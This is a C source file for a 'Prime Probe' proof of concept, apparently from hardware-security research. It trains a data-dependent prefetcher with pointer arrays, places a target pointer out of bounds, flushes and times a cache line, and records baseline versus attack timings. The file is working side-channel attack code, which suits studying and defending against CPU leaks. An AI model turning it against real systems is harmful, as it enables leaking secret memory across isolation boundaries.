#include "../util/util.h"
#include "../EvictionLibrary/evict_lib/evict_algorithm.h"
#include "../EvictionLibrary/evict_lib/evict_set.h"
#include "../bunnyhop/bunnyhop.h"
#include <sys/mman.h>

__attribute__((noinline))
uint64_t victim_load(uint64_t* aop, uint64_t __trash) {
    __trash += aop[0]; 
    return __trash & MSB_MASK;
}

void *thread_work(void *args) {
    set_doitm((uint64_t) args); 
    fprintf(stderr, "In thread read: %lu\n", read_doitm((uint64_t) args));
    while(1) { };
    return NULL; 
}


/* Prime Probe PoC */
int main(int argc, char **argv) {
    if(argc != 4) {
        printf("Usage: ./primeprobe.out <coreid> <reps> <out of bounds read idx>\n");
        exit(1);
    }

    // params
    uint64_t training_aop_size = 300;
    uint64_t core_id = atoi(argv[1]); 
    uint64_t repititions = atoi(argv[2]); 
    uint64_t out_of_bounds_idx = atoi(argv[3]); 

    fprintf(stderr, "Before thread ran: %lu\n", read_doitm(core_id));
    pthread_t tid;
    int status = pthread_create(&tid, NULL, thread_work, (void *) core_id);
    sleep(1); 
    fprintf(stderr, "After thread ran: %lu\n", read_doitm(core_id));

    // pin cpu
    pin_cpu(core_id);

    // output
    printf("Prime Probe PoC!\n");
    printf("Training Size: \t\t%lu\n", training_aop_size);
    printf("Core id: \t\t%lu\n", core_id);
    printf("Reps: \t\t\t%lu\n", repititions);
    printf("OoB Idx: \t\t%lu\n", out_of_bounds_idx);

    // Generate training aop + ptr_under_test
    srand(12);
    volatile uint64_t *training_aop = malloc(sizeof(uint64_t*) * training_aop_size);
    SETUP_DATA_BUFFER(training_buffer);
    for(int i = 0; i < DATA_BUFFER_MASK * U64S_PER_CACHE_LINE; i+=U64S_PER_CACHE_LINE) training_buffer[i] = rand() & (MSB_MASK - 1); 
    for(int i = 0; i < training_aop_size; i++) {
        uint64_t idx = (rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE; 
        training_aop[i] = (uint64_t)&training_buffer[idx]; 
    }

    // Generate Test Buffer 
    volatile uint64_t *test_aop = malloc(sizeof(uint64_t*) * (2 + out_of_bounds_idx));
    SETUP_DATA_BUFFER(test_buffer);
    for(int i = 0; i < 2 + out_of_bounds_idx; i++) 
        test_aop[i] = rand() & (MSB_MASK - 1);

    // Generate ptr_under_test
    uint64_t *ptr_under_test = &test_buffer[(rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE];

    // Generate training 
    uint64_t (*train_ddp)(uint64_t*, uint64_t, uint64_t, uint64_t) = gen_access_aop(COLLISION_FUNC_START(DEFAULT_BASE, ((uint64_t)victim_load)), 300);

    // trash
    uint64_t __trash = 0; 

    // thrash ddp state 
    sleep(0); 

    // begin loop  
    uint64_t mode = 0; 
    uint64_t base_mode = 0; 
    uint64_t base[repititions], atck[repititions];
    for(int k = 0; k < repititions * 2; k++) {

        // idx 
        int i = 0;  

        // setup target pointer
        test_aop[1 + out_of_bounds_idx] = ((uint64_t)ptr_under_test & mode);

        _mm_mfence(); 
        _mm_lfence();

        // flush DDP
        sleep(0);
        __trash = clflush(ptr_under_test, __trash);

        _mm_mfence(); 
        _mm_lfence();

        __trash = train_ddp((uint64_t *)training_aop, training_aop_size, __trash, 1);
        
        _mm_mfence(); 
        _mm_lfence();

        __trash = victim_load((uint64_t *)test_aop, __trash);

        // sleep 
        __trash = c_sleep(1500, __trash);

        // measure 
        uint64_t test_time = time_access(ptr_under_test, __trash);
        __trash = (__trash | test_time) & MSB_MASK;

        // save
        if(mode == base_mode)
            base[k/2] = test_time; 
        else 
            atck[k/2] = test_time;

        mode = ~mode;
    }

    // output 
    // qsort( atck, repititions, sizeof(uint64_t), compare );  
    // qsort( base, repititions, sizeof(uint64_t), compare );  
    printf("Base: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", base[i]);
    printf("\n");
    printf("Atck: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", atck[i]);
    printf("\n");

    // fix the doitm 
    unset_doitm(core_id); 
}
